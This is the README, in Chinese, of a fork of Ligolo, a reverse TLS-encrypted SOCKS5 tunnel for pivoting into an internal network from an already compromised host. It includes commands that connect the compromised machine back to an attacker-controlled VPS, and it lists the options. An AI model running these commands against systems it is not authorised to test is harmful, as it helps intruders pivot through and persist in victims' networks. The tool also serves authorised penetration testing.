# Ligolo : 用于内网渗透的反向隧道

[![forthebadge](https://forthebadge.com/images/badges/made-with-go.svg)](https://forthebadge.com)
[![forthebadge](https://forthebadge.com/images/badges/gluten-free.svg)](https://forthebadge.com)

## 介绍

项目根据 [ligolo](https://github.com/sysdream/ligolo) 修改,主要做一些功能上的裁剪,方便使用.

**Ligolo** 是一个简单的,轻量级的反向Socks5代理工具,所有的流量使用TLS加密.

其功能类似于*Meterpreter*中的*Autoroute + Socks4a*,但是更加稳定,速度更快.

## 使用场景

当你已经在对方内网获取到一台 Windows / Linux / Mac 主机的权限且该主机可以连接互联网.

此时你想要建立一个对方内网的Socks5代理.

**Ligolo** 可以帮助你建立代理,协助你继续进行内网渗透.

> 如果已控主机不能访问互联网,可以尝试使用另一款工具 [pystinger](https://github.com/FunnyWolf/pystinger)

## 使用方法

### TL;DR

- 获取已编译的二进制文件 [release](https://github.com/funnywolf/ligolo/releases)

- 在你的VPS主机中.

```
./ligolos
```

- 在已控制的内网主机中.

```
> ligoloc.exe -s your-vps-ip:443
```

- 连接建立成功后,此时VPS的127.0.0.1:1080已经建立已控主机的内网Socks5代理.

### 详细说明

*Ligolo* 包含两个模块:

- ligolos (server)
- ligoloc (client)

*ligolos* 运行于你的VPS服务器 (攻击服务器).

*ligoloc* 运行于已经控制的内网主机.

*ligolos*可以使用默认设置.它会监听0.0.0.0:443端口(用于等待ligoloc连接)及127.0.0.1:1080(用于socks5代理).

*ligoloc*运行时必须制定服务端地址,使用参数`-s your-vps-ip:443`.

你可以使用`-h`参数查看帮助.

一旦*ligolos* 和 *ligoloc* 之间的连接建立成功,你即可使用VPS服务器`127.0.0.1:1080`的内网socks5代理.

### 选项

*ligolos* options:

```
PS XXX\bin> .\ligolos_windows_amd64.exe -h
Usage of D:\Code\git\go\src\ligolo\bin\ligolos_windows_amd64.exe:
  -cert string
        The TLS server certificate,Unnecessary (default "cert.pem")
  -key string
        The TLS server key,Unnecessary (default "key.pem")
  -l string
        The relay server listening address (the connect-back address) (default "0.0.0.0:443")
  -s5 string
        The local socks5 server address (your proxychains parameter) (default "127.0.0.1:1080")
```

*ligoloc* options:

```
PS XXX\bin> .\ligoloc_windows_amd64.exe -h
Usage of D:\Code\git\go\src\ligolo\bin\ligoloc_windows_amd64.exe:
  -s string
        The relay server (the connect-back address) (default "example.com:443")
```

### 编译

参考原版ligolo的编译方法

## 特性

- TLS 1.3 加密隧道
- 多平台 (Windows / Linux / Mac / ...)
- 多连接复用 (1 TCP连接传输所有流量)
- SOCKS5代理

## To Do

- 更好的超时机制
- SOCKS5 UDP 支持
- mTLS双向认证
- 反向端口映射 (映射内网端口到互联网)

## Licensing

GNU General Public License v3.0 (参考 LICENSING).

## 原版作者

* Nicolas Chatelain <n.chatelain -at- sysdream.com>



